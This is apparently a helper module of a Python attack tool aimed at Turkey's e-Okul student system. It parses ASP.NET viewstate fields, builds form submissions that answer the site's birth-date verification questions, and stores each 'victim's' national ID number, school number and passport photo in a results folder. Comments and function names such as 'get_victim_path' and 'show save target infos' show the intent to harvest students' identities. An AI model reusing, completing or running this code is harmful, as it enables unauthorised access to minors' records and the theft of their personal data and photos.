from PIL import Image
from bs4 import BeautifulSoup
import time
import os
import io
from colorama import Fore
import requests

MIN_EOKUL_NO_LIMIT = 1
MAX_EOKUL_NO_LIMIT = 9999999999
PASSPORT_DEFAULT_PHOTO_SIZE = (105*5, 120*5)
RESULTS_FOLDER_NAME = "results"
SOLVE_ABLE_QUESTIONS = ['Öğrencinin doğum günü hangisidir?',
                        'Öğrencinin doğum ayı hangisidir?', 'Öğrencinin doğum yılı nedir?']
DAY_QUESTION, MONTH_QUESTION, YEAR_QUESTION = SOLVE_ABLE_QUESTIONS
MONTHS = [
    "OCAK",
    "SUBAT",
    "MART",
    "NISAN",
    "MAYIS",
    "HAZIRAN",
    "TEMMUZ",
    "AGUSTOS",
    "EYLUL",
    "EKIM",
    "KASIM",
    "ARALIK"
]

# change with and height of an jpeg image from raw data


def change_image_size(raw_data):
    try:
        image = Image.open(io.BytesIO(raw_data))
        resized_image = image.resize(PASSPORT_DEFAULT_PHOTO_SIZE)
        output_buffer = io.BytesIO()
        resized_image.save(output_buffer, format='JPEG')
        jpeg_output = output_buffer.getvalue()

        return jpeg_output
    except Exception as e:
        print("Image processing error:", e)
        return None


# get viewstates


def get_viewstates(html):
    soup = BeautifulSoup(html, "html.parser")

    __VIEWSTATEFIELDCOUNT = soup.find(
        "input", {"id": "__VIEWSTATEFIELDCOUNT"}).get("value")
    __VIEWSTATE = soup.find("input", {"id": "__VIEWSTATE"}).get("value")
    __VIEWSTATE1 = soup.find("input", {"id": "__VIEWSTATE1"}).get("value")
    __VIEWSTATEGENERATOR = soup.find(
        "input", {"id": "__VIEWSTATEGENERATOR"}).get("value")
    __EVENTVALIDATION = soup.find(
        "input", {"id": "__EVENTVALIDATION"}).get("value")

    viewstates = {
        "__VIEWSTATEFIELDCOUNT": __VIEWSTATEFIELDCOUNT,
        "__VIEWSTATE": __VIEWSTATE,
        "__VIEWSTATE1": __VIEWSTATE1,
        "__VIEWSTATEGENERATOR": __VIEWSTATEGENERATOR,
        "__EVENTVALIDATION": __EVENTVALIDATION
    }

    return viewstates

# get configured payload data


def get_configured_data(rand_index, questions, birthday, birthmonth, birthyear):
    rand_picture = int(rand_index)+1
    first_question, second_question = questions[0].text, questions[1].text

    if first_question == DAY_QUESTION or first_question == MONTH_QUESTION:
        param1 = "ddlS1C1"
    elif first_question == YEAR_QUESTION:
        param1 = "txtS1T1"

    if second_question == DAY_QUESTION or second_question == MONTH_QUESTION:
        param2 = "ddlS2C1"
    elif second_question == YEAR_QUESTION:
        param2 = "txtS2T1"

    if first_question == YEAR_QUESTION and second_question == MONTH_QUESTION:
        hdnSK1 = "N"
        hdnSK2 = "-1"
    elif first_question == MONTH_QUESTION and second_question == YEAR_QUESTION:
        hdnSK2 = "N"
        hdnSK1 = "-1"
    else:
        hdnSK1 = "-1"
        hdnSK2 = "-1"

    if first_question == DAY_QUESTION:
        param1_value = birthday
    elif first_question == MONTH_QUESTION:
        param1_value = birthmonth
    else:
        param1_value = birthyear

    if second_question == DAY_QUESTION:
        param2_value = birthday
    elif second_question == MONTH_QUESTION:
        param2_value = birthmonth
    else:
        param2_value = birthyear

    data = {
        'hdnSK1': str(hdnSK1),
        'hdnSK2': str(hdnSK2),
        'hdnK': '',
        str(param1): str(param1_value),
        str(param2): str(param2_value),
        'rdRes': f'rdRes{rand_picture}',
        'btnTamam': 'Tamam',
    }

    return data

# show and save target infos

def get_victim_path(tckn):
    return os.path.join(os.path.abspath(
        os.path.dirname(__file__)), RESULTS_FOLDER_NAME, str(tckn))


def show_save_general(tckn, eokul_no, start_time, test_size):
    total_time = start_time - time.time()
    print("\n")
    print(Fore.GREEN + "-"*30, end="\n")
    print(Fore.RESET + "TCKN: {}\nEOKUL_NO: {}\n".format(tckn, eokul_no))
    print(Fore.RESET + "Toplam Harcanan Süre {} Saniye.".format(total_time))
    print(Fore.RESET + "Toplam Test {} Saniye.".format(test_size))

    victim_path = get_victim_path(tckn)
    if not os.path.exists(victim_path):
        os.mkdir(victim_path)

    info_file_name = f"{tckn}.txt"
    info_file_path = os.path.join(victim_path, info_file_name)
    with open(info_file_path, "w") as file:
        file.write(f"TCKN : {tckn}\nEOKUL_NO : {eokul_no}")

    print(f"Bilgiler '{info_file_path}' dosyasına başarıyla kaydedilmiştir.", end="\n\n")
    print(Fore.BLUE + "k1n0sh1+4n0rth3 !" + Fore.RESET, end="\n")


def show_save_passport(passport_content, tckn):
    if passport_content:
        victim_path = get_victim_path(tckn)
        if not os.path.exists(victim_path):
            os.makedirs(victim_path)  # Hedef klasörü oluştur

        passport_filename = f"Vesika_{tckn}.jpg"  # Dosya ismini düzenle
        passport_path = os.path.join(victim_path, passport_filename)

        with open(passport_path, "wb") as file:
            file.write(passport_content)

        print(f"Vesikalık fotoğrafı başarıyla '{passport_path}' dosyasına kaydedilmiştir.")

